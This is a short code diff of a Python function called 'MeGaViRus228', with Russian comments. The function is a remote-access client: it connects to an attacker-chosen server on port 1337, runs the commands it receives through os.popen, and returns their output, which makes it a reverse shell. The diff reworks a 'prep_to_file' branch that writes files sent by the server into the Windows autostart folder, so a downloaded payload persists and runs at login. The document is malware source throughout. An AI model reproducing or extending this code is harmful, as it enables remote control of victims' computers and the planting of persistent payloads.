@@ -8,7 +8,7 @@ def MeGaViRus228():
     import socket
 
     HOST = '127.0.0.1'# WIN+R -> CMD -> IPCONFIG -> Ethernet adapter Ethernet ->  IPv4 Address
-                      # Или IP адрес сервера
+                       # Или IP адрес сервера
     
     PORT = 1337
 
@@ -25,14 +25,16 @@ def MeGaViRus228():
             cmd = not cmd
             client.send(f'cmd status: {str(cmd)}'.encode('utf-8'))
 
+        elif s_cmd == 'prep_to_file':
+            f_name = client.recv(1024).decode('utf-8')
+            print(f_name)
+            with open(auto_start_folder + f_name, 'wb') as f:
+                f.write(client.recv(8192))
+
+
         elif cmd:
             out = os.popen(s_cmd).read()
             client.send(f'CMD EXEC: {out}'.encode('utf-8'))
-
-        elif s_cmd == 'prep_to_file':
-            f_name = client.recv(1024).decode('utf-8')
-            rec_virus = open(auto_start_folder+'\\'+f_name, 'wb').write(client.recv(1024))
-
 
         else:
             client.send(f'NOW'.encode('utf-8'))
